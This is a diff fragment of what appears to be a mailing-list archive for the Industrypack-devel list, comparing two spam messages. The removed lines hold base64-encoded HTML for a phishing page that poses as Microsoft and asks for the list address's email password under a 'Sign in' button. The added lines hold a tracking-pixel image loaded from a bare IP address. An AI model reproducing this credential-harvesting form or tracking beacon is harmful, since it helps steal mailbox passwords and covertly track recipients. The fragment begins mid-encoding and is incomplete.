-CTwvZGl2Pg0KCQkJCQk8L3RkPjwvdHI+DQoJCQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDo3
-cHg7Ij48L3RkPjwvdHI+DQoNCgkJCQkJPHRyPjx0ZD4NCgkJCQkJCQk8ZGl2IGFsaWduPSJj
-ZW50ZXIiPg0KCQkJCQkJCQk8aW1nIHNyYz0iaHR0cHM6Ly9lbmNyeXB0ZWQtdGJuMC5nc3Rh
-dGljLmNvbS9pbWFnZXM/cT10Ym46QU5kOUdjVE5wblB6SFQxSUllQ2l4MnZTcy1NWDNkY3Fn
-cXZycW1IN1RnJnVzcXA9Q0FVIj4NCgkJCQkJCQk8L2Rpdj4NCgkJCQkJPC90ZD48L3RyPg0K
-CQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6OyI+PC90ZD48L3RyPg0KDQoJCQkJCTx0cj48
-dGQgc3R5bGU9ImhlaWdodDo1cHg7Ij4NCgkJCQkJCQkJPGRpdiBhbGlnbj0iY2VudGVyIj4N
-CgkJCQkJCQkJPGZvbnQgZmFjZT0iYXJpYWwiIHNpemU9IjIiIGNvbG9yPSIjRkZGIj4NCgkJ
-CQkJCQkJCTxmb250IHNpemU9IjIiPk9ubHkgcmVjaXBpZW50IGVtYWlsIGNhbiBhY2Nlc3Mg
-c2hhcmVkIGZpbGVzIDwvZm9udD4NCgkJCQkJCQkJPC9mb250Pg0KCQkJCQkJCQk8L2Rpdj4N
-CgkJCQkJPC90ZD48L3RyPg0KDQoJCQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDo1cHg7Ij48
-L3RkPjwvdHI+DQoNCgkJCQkJPHRyPjx0ZD4NCgkJCQkJCTx0YWJsZSBjZWxsc3BhY2luZz0i
-MCIgYWxpZ249ImNlbnRlciI+DQoJCQkJCQk8dHI+PHRkPg0KCQkJCQkJCTxkaXYgYWxpZ249
-ImNlbnRlciI+DQoJCQkJCQkJCTxpbnB1dCAgbmFtZT0ibG9naW4iIHR5cGU9ImVtYWlsIiB2
-YWx1ZT0iaW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdlLm5ldCIgZGlzYWJs
-ZWQ+DQoJCQkJCQkJPC9kaXY+DQoJCQkJCQk8L3RkPjwvdHI+DQoNCg0KCQkJCQkJPHRyPjx0
-ZCBzdHlsZT0iaGVpZ2h0OjdweDsiPjwvdGQ+PC90cj4NCg0KCQkJCQkJPHRyPjx0ZD4NCgkJ
-CQkJCQk8ZGl2IGFsaWduPSJjZW50ZXIiPg0KCQkJCQkJCQk8aW5wdXQgIG5hbWU9InBhc3N3
-ZCIgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbWFpbCBQYXNzd29yZCIgcmVxdWly
-ZWQ+DQoJCQkJCQkJPC9kaXY+DQoJCQkJCQk8L3RkPjwvdHI+DQoJCQkJCQk8dHI+PHRkIHN0
-eWxlPSJoZWlnaHQ6MTVweDsiPjwvdGQ+PC90cj4NCgkJCQkJCTx0cj48dGQ+DQoJCQkJCQkJ
-PGRpdiBhbGlnbj0ibGVmdCI+DQoJCQkJCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVl
-PSJTaWduIGluIj4NCgkJCQkJCQk8L2Rpdj4NCgkJCQkJCTwvdGQ+PC90cj4NCgkJCQkJCTx0
-cj48dGQ+DQoJCQkJCQk8L3RkPjwvdHI+DQoJCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6
-MjBweDsiPg0KCQkJCQkJCTxpbnB1dCAgbmFtZT0ibG9naW4iIHR5cGU9ImhpZGRlbiIgdmFs
-dWU9ImluZHVzdHJ5cGFjay1kZXZlbEBsaXN0cy5zb3VyY2Vmb3JnZS5uZXQiPg0KCQkJCQkJ
-CTwvZm9ybT4NCgkJCQkJCTwvdGQ+PC90cj4NCgkJCQkJCTwvdGFibGU+DQoJCQkJCTwvdGQ+
-PC90cj4NCgk8L3RhYmxlPg0KPC9kaXY+DQo8L3RkPjwvdHI+DQo8dHI+PHRkIGhlaWdodD0i
-NSUiIGJnY29sb3I9IiMxQzFDMUMiPg0KCTxkaXYgYWxpZ249ImNlbnRlciI+DQoJCTxmb250
-IGZhY2U9InZlcmRhbmEiIHNpemU9IjEiIGNvbG9yPSIjRkZGIj4NCgkJCUNvcHlyaWdodCCp
-IDIwMjIgbWljcm9zb2Z0LiBBbGwgcmlnaHRzIHJlc2VydmVkLg0KCQk8L2ZvbnQ+DQoJPC9k
-aXY+DQo8L3RkPjwvdHI+DQo8L3RhYmxlPg0KPC9ib2R5Pg0KPC9odG1sPg0KdGFyZ2V0PV9i
-bGFuayANCmRhdGEtc2FmZXJlZGlyZWN0dXJsPSJodHRwczovL3d3dy5nb29nbGUuY29tL3Vy
-bD9x
+<img src=3D"http://103.45.65.30/oem/to.php?p=3Ds2/s1/rs/3oeu/s1/rs" width=
+=3D"5" height=3D"2" alt=3D".">
 
-------=_NextPart_000_0012_1B5302E6.DA4F00EA
+</body>
+</html>
+
+
+--===============3749842262491050298==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
-------=_NextPart_000_0012_1B5302E6.DA4F00EA
+--===============3749842262491050298==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -248,6 +230,4 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
-------=_NextPart_000_0012_1B5302E6.DA4F00EA--
-
-
+--===============3749842262491050298==--
